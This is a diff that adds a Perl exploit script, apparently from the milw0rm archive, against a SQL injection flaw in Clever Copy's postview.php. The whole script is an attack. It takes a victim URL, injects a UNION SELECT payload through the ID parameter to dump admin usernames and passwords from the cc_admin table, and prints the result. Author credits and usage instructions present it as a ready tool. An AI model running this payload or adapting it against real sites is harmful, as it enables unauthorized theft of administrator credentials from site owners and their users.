@@ -1,0 +1,38 @@
+#!/usr/bin/perl  
+# Clever Copy 'postview.php' SQL Injection Vulnerable Exploit Coded
+# By U238 | Web - Designer Solutions Developer
+# Thank you joss
+# My Friends : ka0x - Marco Almeida - The_BekiR - fahn - Teyfik Cevik - Nettoxic - Caborz
+# http://noexec.blogspot.com
+
+
+print "\n\n0x0x0x0x0x0x0x0xx0x0x0x0x0x0x0x0x0x0x0x00x0x0x0x0x0x0x0xx0x\n\n"; 
+print "\n\n# Clever Copy 'postview.php' SQL Injection Vulnerability #\n\n"; 
+print "\n\n# This Bug Discovered By U28 in Exploit Completed #\n\n"; 
+print "\n\n0x0x0x0x0x0x0x0xx0x0x0x0x0x0x0x0x0x0x0x00x0x0x0x0x0x0x0xx0x\n\n"; 
+
+use strict;   
+use LWP::UserAgent; 
+
+my $victim = $ARGV[0]; 
+
+ if(!$ARGV[0]) { 
+    print "\n[x] Exploit Options\n"; 
+    print "[x] U238 : setuid.noexec0x1[-]hotmail[+]com\n"; 
+    print "[x] usage: perl examp.pl (domain)\n"; 
+    print "[x] examp: http://target/path/\n\n"; 
+    print "[x] Referance:http://www.securityfocus.com/bid/28437/info\n\n"; 
+    exit(1); 
+ }  
+  sleep(3);
+  sleep(1);
+    print "\n[+] Baglanildi $victim...\n"; 
+    my $cnx = LWP::UserAgent->new() or die; 
+    my $go=$cnx->get($victim."/postview.php?ID='+union+select+username,concat(0x706173737764,char(58),password,0x2D2D2D,0x757365726E616D653ADA,username),1,5,username,username,6,username,username,9,username+from+cc_admin/*"); 
+    if ($go->content =~ m/____(.*?)____/ms) { 
+        print "$1\n"; 
+    } else { 
+        print "\n[-] exploit calismadi\n"; 
+    }
+
+# milw0rm.com [2008-04-26]
